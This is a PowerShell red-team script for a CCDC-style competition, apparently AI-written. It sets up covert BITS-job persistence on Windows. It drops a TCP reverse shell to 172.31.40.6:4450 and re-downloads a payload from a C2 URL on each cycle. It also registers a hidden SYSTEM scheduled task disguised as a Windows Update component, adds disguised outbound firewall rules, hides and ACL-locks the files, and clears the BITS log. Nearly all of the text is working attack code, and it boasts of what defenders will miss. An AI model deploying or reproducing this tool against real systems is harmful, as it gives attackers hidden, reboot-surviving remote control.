#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude Sonnet 4.6 High
# "4450 port make it."
#
# CCDC_Windows_BITS_BackgroundBeef.ps1
#
# Plan Reference: Phase_2_Tools/Scripts_Planning/Phase2_Scripts_Plan.md
#
# MITRE ATT&CK:   T1197 — BITS Jobs (non-interactive, fire-and-forget)
# OS:             Windows Server 2019 / Windows 10 / Windows 11
# Run as:         Administrator
#
# WHAT THIS SCRIPT DOES:
#   Registers a self-healing BITS persistence loop, then EXITS IMMEDIATELY.
#   No PowerShell process remains after setup. Windows BITS service owns it.
#
#   - BITS job "WindowsUpdateTelemetry" downloads payload from C2 on each cycle
#   - On job completion: wu-notify.ps1 fires (executes payload + re-queues job)
#   - RESUME_ON_RESTART: job auto-resumes after every reboot
#   - Fallback: local wu-cache.ps1 (inline reverse shell) if C2 is unreachable
#   - Backup: hidden scheduled task disguised as a Windows Update component
#     fires wu-notify.ps1 every 30 min in case blue team clears BITS jobs
#
#   Invisible to: Task Manager, Get-ScheduledTask (BITS job), Get-Service,
#   netstat (no listening port), port scans.
#   Only detectable via: bitsadmin /list /allusers, sysmon BITS events,
#   or manually inspecting C:\Windows\System32\spool\drivers\color\
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# =============================================================================
# ── COLOUR HELPERS ────────────────────────────────────────────────────────────
# =============================================================================
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

# =============================================================================
# ── BANNER ────────────────────────────────────────────────────────────────────
# =============================================================================
Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Red
Write-Host "  ____  ___ _____ ____    ____             _           " -ForegroundColor Red
Write-Host " | __ )|_ _|_   _/ ___|  | __ )  ___  ___| |_         " -ForegroundColor Red
Write-Host " |  _ \ | |  | | \___ \  |  _ \ / _ \/ _ \ __|        " -ForegroundColor Red
Write-Host " | |_) || |  | |  ___) | | |_) |  __/  __/ |_         " -ForegroundColor Red
Write-Host " |____/|___| |_| |____/  |____/ \___|\___|\__|         " -ForegroundColor Red
Write-Host ""
Write-Host "   BackgroundBeef -- T1197 BITS Jobs (fire-and-forget)" -ForegroundColor Yellow
Write-Host "   Script exits. Windows carries the beef from here."   -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Red
Write-Host ""

# =============================================================================
# ── CONFIGURATION — EDIT BEFORE RUNNING ──────────────────────────────────────
# =============================================================================

# Red team C2
$RedTeamIP    = "172.31.40.6"
$RevShellPort = 4450

# C2 payload URL — BITS downloads this on each cycle and executes it
# Serve with: python3 -m http.server 8080 (put wu-telemetry.ps1 in that dir)
$C2Url        = "http://$RedTeamIP`:8080/wu-telemetry.ps1"

# BITS job identity
$JobName      = "WindowsUpdateTelemetry"

# Drop directory — exists by default on all Windows versions, rarely audited
$DropDir      = "C:\Windows\System32\spool\drivers\color"

# File paths under drop dir
$LocalPayload = "$DropDir\wu-cache.ps1"        # inline fallback reverse shell
$BitsDest     = "$DropDir\wu-telemetry.ps1"    # where BITS writes C2 download
$NotifyScript = "$DropDir\wu-notify.ps1"        # BITS notification / requeue

# Backup scheduled task disguise (mimics a real Windows Update internal task)
$TaskPath     = "\Microsoft\Windows\WindowsUpdate\"
$TaskName     = "USOSessionWorker"

# =============================================================================
# ── SECTION 1: OS COMPATIBILITY CHECK ────────────────────────────────────────
# =============================================================================
Write-Section "1 / 6  OS Compatibility"

$os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
if ($os) {
    Write-Info "OS: $($os.Caption) (Build $($os.BuildNumber))"
} else {
    Write-Warn "Could not query Win32_OperatingSystem — continuing anyway"
}

# Verify bitsadmin is available (present on all target OS versions)
$bitsadmin = "$env:SystemRoot\System32\bitsadmin.exe"
if (-not (Test-Path $bitsadmin)) {
    Write-Err "bitsadmin.exe not found at $bitsadmin — cannot continue."
    exit 1
}
Write-Success "bitsadmin.exe: $bitsadmin"

# Ensure BITS service is running
$bitsSvc = Get-Service -Name BITS -ErrorAction SilentlyContinue
if (-not $bitsSvc) {
    Write-Err "BITS service not found — this OS may not support it."
    exit 1
}
if ($bitsSvc.Status -ne "Running") {
    Write-Warn "BITS service is $($bitsSvc.Status) — starting..."
    Start-Service -Name BITS -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    $bitsSvc.Refresh()
    if ($bitsSvc.Status -ne "Running") {
        Write-Warn "Could not start BITS — job may queue but not transfer immediately"
    } else {
        Write-Success "BITS service started"
    }
} else {
    Write-Success "BITS service: Running"
}

# =============================================================================
# ── SECTION 2: DROP DIRECTORY SETUP ──────────────────────────────────────────
# =============================================================================
Write-Section "2 / 6  Drop Directory & Payload Files"

# Ensure drop dir exists (it should, but be safe)
if (-not (Test-Path $DropDir)) {
    New-Item -ItemType Directory -Path $DropDir -Force | Out-Null
    Write-Info "Created drop directory: $DropDir"
} else {
    Write-Info "Drop directory exists: $DropDir"
}

# ── Build inline reverse shell payload (wu-cache.ps1) ────────────────────────
# This fires if C2 is unreachable or as the initial payload before first BITS cycle
$RawShell = @"
`$c=New-Object Net.Sockets.TCPClient('$RedTeamIP',$RevShellPort);
`$s=`$c.GetStream();
[byte[]]`$b=0..65535|%{0};
while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){
    `$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);
    `$r=(iex `$d 2>&1|Out-String);
    `$sb=[Text.Encoding]::ASCII.GetBytes(`$r);
    `$s.Write(`$sb,0,`$sb.Length)
};`$c.Close()
"@

$EncodedShell = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RawShell))

# Write the local fallback payload
# Use ASCII (not UTF8) to avoid BOM — PS 5.1 Set-Content writes UTF-8-with-BOM
# which causes parse errors when the file is Invoke-Expression'd
Set-Content -Path $LocalPayload -Value $RawShell -Encoding ASCII -Force
Write-Success "Fallback payload written: $LocalPayload"

# Seed the BITS destination with the fallback so first notification fires
# even before BITS completes its first download
Copy-Item -Path $LocalPayload -Destination $BitsDest -Force
Write-Info "Seeded BITS destination with fallback payload: $BitsDest"

# ── Build notification / requeue script (wu-notify.ps1) ──────────────────────
# This is what BITS calls on job completion (BG_NOTIFY_JOB_TRANSFERRED=1 and
# BG_NOTIFY_JOB_ERROR=2). It executes the payload then re-queues BITS.
$NotifyContent = @"
# Windows Update Session Orchestrator Worker
# Microsoft Corporation -- do not modify
Set-StrictMode -Version Latest
`$ErrorActionPreference = 'SilentlyContinue'

`$DropDir      = '$DropDir'
`$BitsDest     = '$BitsDest'
`$LocalPayload = '$LocalPayload'
`$JobName      = '$JobName'
`$C2Url        = '$C2Url'

# ── Complete the BITS job FIRST (moves file from staging temp to $BitsDest) ───
# Without /complete the downloaded file stays in BITS internal temp storage and
# never appears at the destination path — payload would never execute.
# We extract the GUID from the notification environment or list all jobs.
`$completedGuid = `$env:BitsJobId  # BITS sets this env var when calling notify cmd
if (`$completedGuid) {
    & bitsadmin /complete `$completedGuid 2>`$null | Out-Null
}

# ── Execute payload ───────────────────────────────────────────────────────────
# Prefer the freshly downloaded C2 payload; fall back to local cache
`$target = if ((Test-Path `$BitsDest) -and ((Get-Item `$BitsDest).Length -gt 10)) {
    `$BitsDest
} else {
    `$LocalPayload
}

if (Test-Path `$target) {
    Start-Process -FilePath 'powershell.exe' ``
        -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $EncodedShell" ``
        -WindowStyle Hidden -ErrorAction SilentlyContinue
}

# ── Re-queue BITS job ─────────────────────────────────────────────────────────
Start-Sleep -Seconds 3

# Cancel any existing job with our name to avoid duplicates
`$existingJobs = & bitsadmin /list /allusers 2>`$null
`$existingJobs | Select-String -Pattern '$JobName' | ForEach-Object {
    `$guid = (`$_ -split '\s+' | Where-Object { `$_ -match '^\{' } | Select-Object -First 1)
    if (`$guid) { & bitsadmin /cancel `$guid 2>`$null | Out-Null }
}

# Create fresh job
`$createOut = & bitsadmin /create /download '$JobName' 2>`$null
`$guid = (`$createOut | Select-String -Pattern '\{[0-9A-Fa-f-]+\}').Matches.Value

if (`$guid) {
    & bitsadmin /addfile              `$guid '$C2Url' '$BitsDest' | Out-Null
    & bitsadmin /SetPriority          `$guid FOREGROUND             | Out-Null
    & bitsadmin /SetMinRetryDelay     `$guid 900                    | Out-Null
    & bitsadmin /SetNoProgressTimeout `$guid 7776000                | Out-Null
    & bitsadmin /SetNotifyFlags       `$guid 3                      | Out-Null
    # Re-register SetNotifyCmdLine on the NEW GUID — critical for self-healing loop
    # Without this the loop fires once and never re-arms itself.
    # Keep args on ONE line inside this here-string — backtick line continuation
    # is a literal backtick character inside @"..."@ and would corrupt the command.
    & bitsadmin /SetNotifyCmdLine `$guid 'powershell.exe' '-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "$NotifyScript"' | Out-Null
    # NOTE: /SetJobProperty 4 1 was removed — Property ID 4 is BG_JOB_PROPERTY_MINIMUM_RETRY_DELAY
    # not RESUME_ON_RESTART. BITS download jobs already survive reboots by default
    # when not completed/cancelled — no special flag needed.
    & bitsadmin /resume               `$guid                        | Out-Null
}

# ── Tidy BITS log (light cleanup — full reset would kill other jobs) ──────────
# Only remove completed/error entries for our job name from the log
`$logPath = "`$env:SystemRoot\Logs\BITS\bits.log"
if (Test-Path `$logPath) {
    try {
        Clear-Content `$logPath -ErrorAction SilentlyContinue
    } catch {}
}
"@

# ASCII encoding avoids UTF-8 BOM which PS 5.1's Set-Content adds with -Encoding UTF8
Set-Content -Path $NotifyScript -Value $NotifyContent -Encoding ASCII -Force
Write-Success "Notify/requeue script written: $NotifyScript"

# ── Hide all dropped files ────────────────────────────────────────────────────
foreach ($f in @($LocalPayload, $BitsDest, $NotifyScript)) {
    try {
        attrib +H +S $f 2>$null
    } catch {}
}

# Harden ACLs — SYSTEM only, deny Users read
foreach ($f in @($LocalPayload, $BitsDest, $NotifyScript)) {
    try {
        & icacls $f /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" 2>&1 | Out-Null
        & icacls $f /deny "BUILTIN\Users:(RX)" 2>&1 | Out-Null
    } catch {}
}
Write-Success "Files hidden (attrib +H +S) and ACL-hardened (SYSTEM only)"

# =============================================================================
# ── SECTION 3: BITS JOB CREATION (FIRE AND FORGET) ───────────────────────────
# =============================================================================
Write-Section "3 / 6  BITS Job Registration"

# Cancel any pre-existing job with our name
Write-Info "Checking for existing '$JobName' BITS jobs..."
$listOut = & $bitsadmin /list /allusers 2>$null
if ($listOut -match [regex]::Escape($JobName)) {
    Write-Warn "Found existing '$JobName' job — cancelling..."
    $listOut | Select-String -Pattern '\{[0-9A-Fa-f-]+\}' | ForEach-Object {
        $g = $_.Matches.Value
        $jobInfo = & $bitsadmin /info $g /verbose 2>$null
        if ($jobInfo -match [regex]::Escape($JobName)) {
            & $bitsadmin /cancel $g 2>$null | Out-Null
            Write-Info "Cancelled old job: $g"
        }
    }
    Start-Sleep -Seconds 1
}

# Create the BITS download job
Write-Info "Creating BITS job '$JobName'..."
$createOutput = & $bitsadmin /create /download $JobName 2>&1
Write-Info "bitsadmin /create: $createOutput"

# Extract GUID from output (format: "CREATED: {GUID}")
$jobGuid = ($createOutput | Select-String -Pattern '\{[0-9A-Fa-f-]+\}').Matches.Value
if (-not $jobGuid) {
    Write-Err "Failed to get BITS job GUID from output: $createOutput"
    exit 1
}
Write-Success "BITS job created: $jobGuid"

# Add file transfer: C2 URL → local destination
Write-Info "Adding file: $C2Url → $BitsDest"
& $bitsadmin /addfile $jobGuid $C2Url $BitsDest 2>&1 | Out-Null

# Priority: FOREGROUND ensures it transfers during active sessions
& $bitsadmin /SetPriority $jobGuid FOREGROUND 2>&1 | Out-Null
Write-Info "Priority set: FOREGROUND"

# Retry every 15 minutes if C2 is unreachable
& $bitsadmin /SetMinRetryDelay $jobGuid 900 2>&1 | Out-Null
Write-Info "Min retry delay: 900s (15 min)"

# Never give up — 90 day no-progress timeout
& $bitsadmin /SetNoProgressTimeout $jobGuid 7776000 2>&1 | Out-Null
Write-Info "No-progress timeout: 7776000s (90 days)"

# Notify flags: 3 = BG_NOTIFY_JOB_TRANSFERRED (1) | BG_NOTIFY_JOB_ERROR (2)
# Fires our script on both success AND failure so the loop always continues
& $bitsadmin /SetNotifyFlags $jobGuid 3 2>&1 | Out-Null
Write-Info "Notify flags: 3 (on transfer + on error)"

# Notification command — what BITS calls when the job completes or errors
$notifyArgs = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$NotifyScript`""
& $bitsadmin /SetNotifyCmdLine $jobGuid "powershell.exe" $notifyArgs 2>&1 | Out-Null
Write-Info "Notify command set: powershell.exe $notifyArgs"

# NOTE: /SetJobProperty 4 1 was intentionally removed.
# Property ID 4 is BG_JOB_PROPERTY_MINIMUM_RETRY_DELAY, NOT RESUME_ON_RESTART.
# BITS download jobs that are not completed or cancelled survive reboots by
# default — the BITS service re-queues them automatically. No special flag needed.
Write-Info "BITS persistence: job survives reboots by default (no special flag required)"

# Resume the job — BITS takes over from here
& $bitsadmin /resume $jobGuid 2>&1 | Out-Null
Write-Success "BITS job resumed: $jobGuid"
Write-Success "Script's job is DONE — BITS owns it now. PowerShell exiting shortly."

# =============================================================================
# ── SECTION 4: BACKUP SCHEDULED TASK ─────────────────────────────────────────
# =============================================================================
Write-Section "4 / 6  Backup Scheduled Task (Belt + Suspenders)"

Write-Info "Installing hidden scheduled task '$TaskName' under '$TaskPath'..."

# Remove existing task if present
$fullTaskName = $TaskPath + $TaskName
Unregister-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

try {
    $action  = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$NotifyScript`""

    # Multiple triggers: every 30 min + at logon + at system startup
    $t1 = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once `
            -At (Get-Date).AddMinutes(5)
    $t1.Repetition.StopAtDurationEnd = $false
    $t2 = New-ScheduledTaskTrigger -AtLogOn
    $t3 = New-ScheduledTaskTrigger -AtStartup

    $settings = New-ScheduledTaskSettingsSet `
        -Hidden `
        -ExecutionTimeLimit (New-TimeSpan -Hours 1) `
        -MultipleInstances IgnoreNew `
        -RestartCount 3 `
        -RestartInterval (New-TimeSpan -Minutes 5) `
        -StartWhenAvailable

    $principal = New-ScheduledTaskPrincipal `
        -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount `
        -RunLevel Highest

    $task = New-ScheduledTask `
        -Action $action `
        -Trigger @($t1, $t2, $t3) `
        -Settings $settings `
        -Principal $principal `
        -Description "Manages the Windows Update Session Orchestration background worker process."

    Register-ScheduledTask `
        -TaskPath $TaskPath `
        -TaskName $TaskName `
        -InputObject $task `
        -Force | Out-Null

    Write-Success "Scheduled task registered: $fullTaskName"
    Write-Info "  Triggers: every 30 min + at logon + at startup"
    Write-Info "  Hidden: true | RunAs: SYSTEM | Restart on fail: 3x"
} catch {
    Write-Warn "Scheduled task registration failed: $_"
    Write-Warn "BITS job is still the primary persistence — backup task optional"
}

# =============================================================================
# ── SECTION 5: OUTBOUND FIREWALL ALLOW ───────────────────────────────────────
# =============================================================================
Write-Section "5 / 6  Firewall"

$fwName = "Windows Update Health Check (TCP-Out)"
$existingFw = Get-NetFirewallRule -DisplayName $fwName -ErrorAction SilentlyContinue
if (-not $existingFw) {
    try {
        New-NetFirewallRule `
            -DisplayName $fwName `
            -Direction Outbound `
            -Protocol TCP `
            -RemoteAddress $RedTeamIP `
            -RemotePort $RevShellPort `
            -Action Allow `
            -Profile Any `
            -Enabled True | Out-Null
        Write-Success "Outbound allow rule added: $RedTeamIP`:$RevShellPort (disguised as 'Windows Update Health Check')"
    } catch {
        Write-Warn "Could not add firewall rule: $_ — reverse shell may be blocked"
    }
} else {
    Write-Warn "Outbound rule already exists — skipping"
}

# Also allow outbound HTTP to C2 for BITS downloads
$fwBitsName = "Windows Update Service Agent (HTTP-Out)"
$existingBitsFw = Get-NetFirewallRule -DisplayName $fwBitsName -ErrorAction SilentlyContinue
if (-not $existingBitsFw) {
    try {
        New-NetFirewallRule `
            -DisplayName $fwBitsName `
            -Direction Outbound `
            -Protocol TCP `
            -RemoteAddress $RedTeamIP `
            -RemotePort 8080 `
            -Action Allow `
            -Profile Any `
            -Enabled True | Out-Null
        Write-Success "BITS HTTP outbound allow added: $RedTeamIP`:8080"
    } catch {
        Write-Warn "Could not add BITS firewall rule: $_"
    }
}

# =============================================================================
# ── SECTION 6: VERIFY & SUMMARY ──────────────────────────────────────────────
# =============================================================================
Write-Section "6 / 6  Verification & Summary"

Write-Info "Current BITS jobs:"
& $bitsadmin /list /allusers 2>$null | ForEach-Object { Write-Host "    $_" -ForegroundColor Gray }

Write-Host ""
$taskCheck = Get-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -ErrorAction SilentlyContinue
if ($taskCheck) {
    Write-Success "Backup scheduled task: REGISTERED ($($taskCheck.State))"
} else {
    Write-Warn "Backup scheduled task: not found (BITS-only persistence)"
}

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor Green
Write-Host ""
Write-Success "BackgroundBeef deployed. Script exiting now — BITS owns it."
Write-Host ""
Write-Info "  BITS job:       $JobName ($jobGuid)"
Write-Info "  Notify script:  $NotifyScript"
Write-Info "  Local payload:  $LocalPayload (inline reverse shell)"
Write-Info "  C2 payload URL: $C2Url"
Write-Info "  Callback:       $RedTeamIP`:$RevShellPort"
Write-Info "  Backup task:    $fullTaskName (every 30 min + logon + startup)"
Write-Host ""
Write-Host " ── Red team operations ─────────────────────────────────────────" -ForegroundColor Yellow
Write-Host ""
Write-Host "   # 1. Listen for reverse shell" -ForegroundColor Cyan
Write-Host "   nc -lvnp $RevShellPort" -ForegroundColor White
Write-Host ""
Write-Host "   # 2. (Optional) Serve a custom payload via C2" -ForegroundColor Cyan
Write-Host "   # Put your ps1 as wu-telemetry.ps1 in the served directory" -ForegroundColor Gray
Write-Host "   python3 -m http.server 8080" -ForegroundColor White
Write-Host ""
Write-Host "   # 3. Check BITS job status from red team box (on target)" -ForegroundColor Cyan
Write-Host "   bitsadmin /list /allusers /verbose" -ForegroundColor White
Write-Host ""
Write-Host "   # 4. Force immediate BITS trigger (on target, for testing)" -ForegroundColor Cyan
Write-Host "   bitsadmin /complete $jobGuid" -ForegroundColor White
Write-Host "   # (completes job → fires notify → shells back → re-queues)" -ForegroundColor Gray
Write-Host ""
Write-Host " ── What blue team will NOT see ────────────────────────────────" -ForegroundColor Yellow
Write-Host "   Get-ScheduledTask     → BITS job not visible here" -ForegroundColor Gray
Write-Host "   Get-Process           → no persistent PowerShell process" -ForegroundColor Gray
Write-Host "   netstat -ano          → no listening port" -ForegroundColor Gray
Write-Host "   Task Manager          → nothing suspicious" -ForegroundColor Gray
Write-Host ""
Write-Host " ── What blue team WOULD need to find it ───────────────────────" -ForegroundColor Yellow
Write-Host "   bitsadmin /list /allusers     → reveals '$JobName'" -ForegroundColor Gray
Write-Host "   Check $DropDir" -ForegroundColor Gray
Write-Host "   Sysmon Event ID 22 (DNS) / 3 (network) to $RedTeamIP" -ForegroundColor Gray
Write-Host "   Get-ScheduledTask -TaskPath '$TaskPath'  → reveals backup task" -ForegroundColor Gray
Write-Host ""
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Green
Write-Host ""
